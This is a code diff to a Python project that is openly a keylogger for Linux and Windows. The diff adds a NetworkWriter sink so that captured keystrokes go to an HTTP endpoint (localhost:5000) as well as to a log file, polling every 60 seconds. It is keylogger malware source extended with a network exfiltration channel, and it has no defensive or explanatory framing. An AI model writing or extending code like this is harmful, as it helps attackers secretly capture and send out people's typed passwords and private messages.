@@ -5,6 +5,7 @@ import time
 from typing import Protocol
 
 from keylogger.file_writer import FileWriter
+from network_writer import NetworkWriter
 from .sinker import Sinker
 from .processor import  Processor
 from .listner import LinuxKeylogger, WindowsKeylogger, Listener
@@ -50,7 +51,7 @@ class DefaultManager:
             keylogger = LinuxKeylogger()
 
         self.processor = Processor("")
-        self.sink = FileWriter("keylogger.log")
+        self.sink = [FileWriter("keylogger.log"),NetworkWriter("http://localhost:5000")]
         self.listner = keylogger
         self.interval = 60
         self._loop_thread = threading.Thread(target=self._loop)
@@ -84,5 +85,6 @@ class DefaultManager:
             data = self.listner.get_data()
             if data:
                 processed_data = self.processor.process(data)
-                self.sink.sink(processed_data)
+                for sink in self.sink:
+                    sink.sink(processed_data)
             time.sleep(self.interval)
